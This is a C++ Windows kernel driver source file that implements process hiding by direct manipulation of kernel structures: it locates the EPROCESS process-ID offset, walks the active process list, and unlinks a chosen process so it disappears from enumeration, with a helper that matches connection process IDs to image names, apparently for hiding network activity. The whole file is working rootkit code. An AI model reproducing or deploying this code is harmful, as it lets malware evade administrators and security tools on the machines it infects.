#include "HideProcess.h"
#include "NetworkHook.h"

ULONG HideProcess::GetUniquePIDOffSetFromEProcess()
{
	ULONG pid_ofs = 0; // The offset we're looking for
	int idx = 0;                // Index 
	ULONG pids[3]{0};				// List of PIDs for our 3 processes
	PEPROCESS eprocs[3];		// Process list, will contain 3 processes

	//Select 3 process PIDs and get their EPROCESS Pointer
	for (int i = 16; idx < 3; i += 4)
	{
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx])))
		{
			pids[idx] = i;
			idx++;
		}
	}

	/*
	Go through the EPROCESS structure and look for the PID
	we can start at 0x20 because UniqueProcessId should
	not be in the first 0x20 bytes,
	also we should stop after 0x300 bytes with no success
	*/
	for (int i = 0x20; i < 0x800; i += 4)
	{
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i;
			break;
		}
	}

	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);


	return pid_ofs;
}

typedef NTSTATUS (*QUERY_INFO_PROCESS)
(
	__in HANDLE ProcessHandle,
	__in PROCESSINFOCLASS ProcessInformationClass,
	__out_bcount(ProcessInformationLength) PVOID ProcessInformation,
	__in ULONG ProcessInformationLength,
	__out_opt PULONG ReturnLength
);
QUERY_INFO_PROCESS ZwQueryInformationProcess;

static BOOLEAN DoesProcessNameMatches(
	_In_ PEPROCESS eProcess, 
	_In_ const UNICODE_STRING& ProcessImageName)
{
	PAGED_CODE(); // this eliminates the possibility of the IDLE Thread/Process

	// Validaity 1.
	if (eProcess == nullptr)
	{
		return FALSE;
	}
	HANDLE hProcess{ nullptr };
	NTSTATUS status = ObOpenObjectByPointer(eProcess,
		0, nullptr, 0, 0, KernelMode, &hProcess);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("ObOpenObjectByPointer Failed: %08x\n", status);
		return FALSE;
	}

	//  Validity 2
	if (nullptr == ZwQueryInformationProcess)
	{
		UNICODE_STRING routineName{};
		RtlInitUnicodeString(&routineName, L"ZwQueryInformationProcess");
		ZwQueryInformationProcess =
			(QUERY_INFO_PROCESS)MmGetSystemRoutineAddress(&routineName);
		if (nullptr == ZwQueryInformationProcess) 
		{
			DbgPrint("Cannot resolve ZwQueryInformationProcess\n");
			ZwClose(hProcess);
			return FALSE;
		}
	}
	
	//
	// Step one - get the size we need
	//
	ULONG returnedLength{ 0 };
	status = ZwQueryInformationProcess(hProcess,
		ProcessImageFileName,
		nullptr,
		0,
		&returnedLength);
	if (STATUS_INFO_LENGTH_MISMATCH != status) 
	{
		DbgPrint("%s. Error[0x%X]\n", __FUNCTION__, status);
		ZwClose(hProcess);
		return FALSE;
	}

	//
	// If we get here, let's allocate some storage.
	//
	PVOID buffer = ExAllocatePool2(POOL_FLAG_PAGED, returnedLength, TAG_NET);
	if (nullptr == buffer) 
	{
		DbgPrint("%s. Error[STATUS_INSUFFICIENT_RESOURCES]\n", __FUNCTION__);
		ZwClose(hProcess);
		return FALSE;
	}

	//
	// Now lets go get the data
	//
	BOOLEAN bRet = FALSE;
	status = ZwQueryInformationProcess(hProcess,
		ProcessImageFileName,
		buffer,
		returnedLength,
		&returnedLength);
	if (NT_SUCCESS(status)) 
	{
		//
		// Ah, we got what we needed
		//
		PUNICODE_STRING imageName = (PUNICODE_STRING)buffer;
		if (0 == RtlCompareUnicodeString(imageName, &ProcessImageName, TRUE))
		{
			DbgPrint("Matched ProcessName[%wZ] and ReceivedProcessName[%wZ]\n", imageName, &ProcessImageName);
			bRet = TRUE;
		}
	}

	//
	// free our buffer
	//
	ExFreePoolWithTag(buffer, TAG_NET);
	ZwClose(hProcess);

	//
	// And tell the caller what happened.
	//   
	return bRet;

}

BOOLEAN HideProcess::DoesPIDBelongToProcessName(
	_In_ const ULONG ConnectPID,
	_In_ const UNICODE_STRING& processName)
{
	// Validity Check.
	if ((ConnectPID == 0) || (processName.Buffer == nullptr) || (processName.Length == 0))
	{
		return FALSE;
	}

	// Get the Corresponding ProcessID of the process.
	// Get PID offset nt!_EPROCESS.UniqueProcessId
	ULONG PID_OFFSET = HideProcess::GetUniquePIDOffSetFromEProcess();

	// Check if offset discovery was successful 
	if (PID_OFFSET == 0)
	{
		return FALSE;
	}

	// Get LIST_ENTRY offset nt!_EPROCESS.ActiveProcessLinks
	ULONG LIST_OFFSET = PID_OFFSET;

	// Check Architecture using pointer size
	INT_PTR ptr{};

	// Ptr size 8 if compiled for a 64-bit machine, 4 if compiled for 32-bit machine
	LIST_OFFSET += sizeof(ptr);

	// Record offsets for user buffer
	KdPrint(("Found offsets: %lu & %lu", PID_OFFSET, LIST_OFFSET));

	// Get current process
	PEPROCESS CurrentEPROCESS = IoGetCurrentProcess();

	// Initialize other variables
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PULONG CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	// Check self 
	if ((*(ULONG*)CurrentPID == ConnectPID) && DoesProcessNameMatches(CurrentEPROCESS, processName))
	{
		return TRUE;
	}

	// Record the starting position
	PEPROCESS StartProcess = CurrentEPROCESS;

	// Move to next item
	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	// Loop until we find the right process to remove
	// Or until we circle back
	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS)
	{

		// Check item
		if ((*(ULONG*)CurrentPID == ConnectPID) && DoesProcessNameMatches(CurrentEPROCESS, processName))
		{
			return TRUE;
		}

		// Move to next item
		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

	return FALSE;
}

NTSTATUS HideProcess::HideProcessByProcessID(ULONG pid)
{
	// Get PID offset nt!_EPROCESS.UniqueProcessId
	ULONG PID_OFFSET = GetUniquePIDOffSetFromEProcess();

	// Check if offset discovery was successful 
	if (PID_OFFSET == 0) 
	{
		return STATUS_NOT_FOUND;
	}

	// Get LIST_ENTRY offset nt!_EPROCESS.ActiveProcessLinks
	ULONG LIST_OFFSET = PID_OFFSET;


	// Check Architecture using pointer size
	INT_PTR ptr{};

	// Ptr size 8 if compiled for a 64-bit machine, 4 if compiled for 32-bit machine
	LIST_OFFSET += sizeof(ptr);

	// Record offsets for user buffer
	KdPrint(("Found offsets: %lu & %lu", PID_OFFSET, LIST_OFFSET));

	// Get current process
	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();
	
	// Initialize other variables
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PULONG CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	// Check self 
	if (*(ULONG*)CurrentPID == pid) 
	{
		UnlinkCurrentProcessLinks(CurrentList);
		return STATUS_SUCCESS;
	}

	// Record the starting position
	PEPROCESS StartProcess = CurrentEPROCESS;

	// Move to next item
	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	// Loop until we find the right process to remove
	// Or until we circle back
	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) 
	{

		// Check item
		if (*(ULONG*)CurrentPID == pid) {
			UnlinkCurrentProcessLinks(CurrentList);
			return STATUS_SUCCESS;
		}

		// Move to next item
		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PULONG)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

	return STATUS_NOT_FOUND;
}

void HideProcess::UnlinkCurrentProcessLinks(PLIST_ENTRY Current) {

	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	// Loop over self (connect previous with next)
	Previous->Flink = Next;
	Next->Blink = Previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;

	return;

}